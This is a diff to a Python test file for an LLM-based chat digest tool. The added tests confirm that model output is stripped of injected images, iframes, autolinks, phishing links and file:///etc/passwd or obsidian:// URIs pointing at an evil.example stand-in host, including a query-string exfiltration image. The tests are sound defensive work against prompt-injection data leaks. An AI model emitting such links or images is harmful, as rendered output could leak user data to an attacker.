@@ -1,5 +1,7 @@
+import pytest
+
 from crier.digest import CHECKINS, Digester, group_by_thread, pack
-from crier.links import NO_SOURCE, encode_hash, link_citations, message_url
+from crier.links import NO_SOURCE, defang, encode_hash, link_citations, message_url
 from crier.llm import LLM, strip_reasoning
 from crier.store import Store
 from crier.zulip import Message
@@ -40,7 +42,41 @@ def test_citations_link_and_flag_inventions():
 
 
 def test_plain_footnotes_untouched():
-    assert link_citations("- see [1] and [link](https://x.example) [m101]", BY_ID, SITE).count("[1]") == 1
+    out = link_citations("- see [1] and [link](https://x.example) [m101]", BY_ID, SITE)
+    assert out.count("[1]") == 1
+    assert out.startswith("- see [1] and link [↗]")
+
+
+@pytest.mark.parametrize("injected", [
+    "![](https://evil.example/?q=dumplings)",
+    "![x](//evil.example/p.png)",
+    '<img src="https://evil.example/p.png">',
+    "<iframe src=https://evil.example></iframe>",
+    "<https://evil.example/autolink>",
+    "[click](https://evil.example/phish)",
+    "see https://evil.example/bare",
+    "obsidian://open?vault=x and file:///etc/passwd",
+])
+def test_model_links_and_images_are_stripped(injected):
+    out = link_citations(f"- lunch at 12:30 {injected} [m103]", BY_ID, SITE)
+    assert "evil.example" not in out and "file:" not in out and "<" not in out
+    assert "obsidian://" not in out
+    assert out.startswith("- lunch at 12:30")
+    # Our own citation link survives.
+    assert message_url(SITE, BY_ID[103]) in out
+
+
+def test_reference_style_image_is_stripped():
+    text = "- lunch ![x][e] [m103]\n[e]: https://evil.example/p.png\n[f]: //evil.example/q"
+    out = link_citations(text, BY_ID, SITE)
+    assert "evil.example" not in out
+    # A line that only looks like a definition is kept.
+    assert defang("[m103]: Note: lunch at noon") == "[m103]: Note: lunch at noon"
+
+
+def test_defang_leaves_plain_text_alone():
+    text = "- **Fri 4pm**: talk on a < b > c, `code`, [[wiki link]] [m104]"
+    assert defang(text) == text
 
 
 # --- chunking ---
